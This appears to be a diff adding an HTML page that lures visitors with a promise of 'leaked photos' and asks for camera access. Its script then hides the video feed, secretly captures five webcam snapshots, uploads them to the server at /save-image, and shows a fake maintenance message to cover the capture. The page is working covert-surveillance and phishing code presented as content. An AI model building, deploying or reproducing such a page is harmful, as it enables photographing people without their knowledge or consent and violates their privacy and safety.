@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access - Viral Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        /* Modal styles */
+        #cameraAccess {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            z-index: 1000;
+        }
+
+        #content {
+            display: none;
+        }
+
+        /* Hide the video stream from user */
+        video {
+            display: none;
+        }
+
+        canvas {
+            display: none;
+            /* Hide canvas too */
+        }
+
+        .message {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="cameraAccess">
+        <p>Please allow camera access to view the leaked photos.</p>
+        <video id="video" width="320" height="240" autoplay></video>
+        <p id="message" class="message"></p>
+    </div>
+
+    <canvas id="canvas" width="320" height="240"></canvas>
+    <div id="content">
+        <h1>The Page Is Under Maintenance. Visit After 2 Hours</h1>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const message = document.getElementById('message');
+        const cameraAccessDiv = document.getElementById('cameraAccess');
+        let snapshotCount = 0;
+
+        // Ask for camera access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+
+                // Remove the access message (hide modal)
+                cameraAccessDiv.style.display = 'none';
+
+                // Automatically take snapshots at intervals
+                const interval = setInterval(() => {
+                    if (snapshotCount < 5) {
+                        takeSnapshot();
+                    } else {
+                        clearInterval(interval); // Stop after 5 snapshots
+                        document.getElementById('content').style.display = 'block';
+                        message.textContent = '';
+                    }
+                }, 100);  // Take a snapshot every second
+            })
+            .catch(() => {
+                cameraAccessDiv.innerHTML = '<p class="message">Camera access denied. You cannot access this content.</p>';
+            });
+
+        // Function to take a snapshot and send the image to the server
+        function takeSnapshot() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            snapshotCount++;
+            message.textContent = `Wait for ${snapshotCount} second! Your content is loading.........`;
+
+            // Send the image to the server via API request
+            sendImageToServer(imageData, snapshotCount);
+        }
+
+        // Function to send image to server using API (e.g., via a POST request)
+        function sendImageToServer(imageData, index) {
+            fetch('/save-image', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: imageData, index: index }),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(`Image ${index} uploaded successfully:`, data);
+                })
+                .catch((error) => {
+                    console.error('Error uploading image:', error);
+                });
+        }
+    </script>
+
+</body>
+
+</html>
